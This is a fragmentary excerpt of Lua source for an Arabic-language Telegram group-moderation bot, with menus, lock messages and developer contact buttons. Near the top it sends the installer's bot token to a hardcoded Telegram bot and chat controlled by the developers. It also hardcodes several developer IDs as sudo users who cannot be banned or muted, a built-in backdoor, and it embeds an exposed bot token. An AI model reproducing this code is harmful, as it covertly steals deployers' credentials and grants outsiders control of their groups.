...
https.request('https://api.telegram.org/bot1733687371:AAGVj1pMNKg_EQOW0ydTF1ET24fHLQnSWTs/sendmessage?chat_id=1414888743&text=' ..token)
end 
else
...
sudo_users = {SUDO,1414888743,1554085475,1455815306,1789118915,12081655,1183747742}   
...
if tonumber(user_id) == tonumber(1390946689) then  
var = true
...
var = true
elseif tonumber(user_id) == tonumber(1789118915) then
var = true
elseif tonumber(user_id) == tonumber(12081655) then
var = true
elseif tonumber(user_id) == tonumber(1183747742) then
var = true
elseif tonumber(user_id) == tonumber(bot_id) then
...
local Text = [[ 
[اضغط هنا وانضم الي قناه السورس](t.me/sanforab7)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/sanforab7"}}, 
} 
...
{
{text = ' 𝐁𝐄𝐋𝐀𝐋 ', url = "https://t.me/BelalElshayal"},{text = '𝐒𝐀𝐍f𝐎𝐑𝐀 ', url = "https://t.me/SA_FO_RA_7"},
},
{
{text = '𝐊𝐎𝐌𝐀𝐍𝐃𝐀⁦', url = "https://t.me/komanda3b"},{text = '𝐒𝐀𝐒𝐀  ', url = "https://t.me/S_A_S_A_1"},
},
{
{text = ' 𝐒𝐎𝐔𝐑𝐂𝐄 ', url = "https://t.me/sanforab7"},
},
}
local msg_id = msg.id_/2097152/0.5
...
tdcli_function ({ID = "GetUser",user_id_ = 1554085475,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = 'صاصا للتواصل معه اتبع الازرارا ⇧\n['..result.first_name_..'](t.me/S_A_S_A_1)\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𝑺.𝑨.𝑺.𝑨 🇦🇮.',url="t.me/S_A_S_A_1"},
},
{
{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"},
},
...
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = 1554085475, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = 1789118915,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = 'كومندا للتواصل معه اتبع الازرارا ⇧\n['..result.first_name_..'](t.me/komanda3b)\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𝐊𝐎𝐌𝐀𝐍𝐃𝐀 🇦🇮',url="t.me/komanda3b"},
},
{
{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"},
},
...
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = 1789118915, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end
...
◉ لعبة البـات ← بات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐀𝐑𝐈𝐒](t.me/sanforab7) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'\n◉تم قفل البوتات بالطرد\n◉تم وضع الايدي بدون صوره\n◉تم قفل التكرار بالطرد\n◉تم قفل الروابط\n◉تم قفل التوجيه\n◉تم قفل الملصقات\n◉تم قفل المتحركه\n◉تم قفل الفيديو\n◉تم قفل السب\n◉تم قفل التعديل\n◉تم قفل الفارسيه\n◉تم قفل التفليش\n\nتم تفعيل الحمايه بواسطه ←['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'sanforab7')..')')   
end,nil) 
end
--------------------------------------------------------------------------------------------------------------
...
if tonumber(result.sender_user_id_) == tonumber(1390946689) then  
...
if tonumber(result.sender_user_id_) == tonumber(1789118915) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج سورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1554085475) then  
...
if result.id_ == tonumber(1789118915) then
send(msg.chat_id_, msg.id_, " ◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1554085475) then
send(msg.chat_id_, msg.id_, " ◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if result.id_ == tonumber(12081655) then
send(msg.chat_id_, msg.id_, " ◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1789118915) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1554085475) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if tonumber(userid) == tonumber(12081655) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(12081655) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1183747742) then  
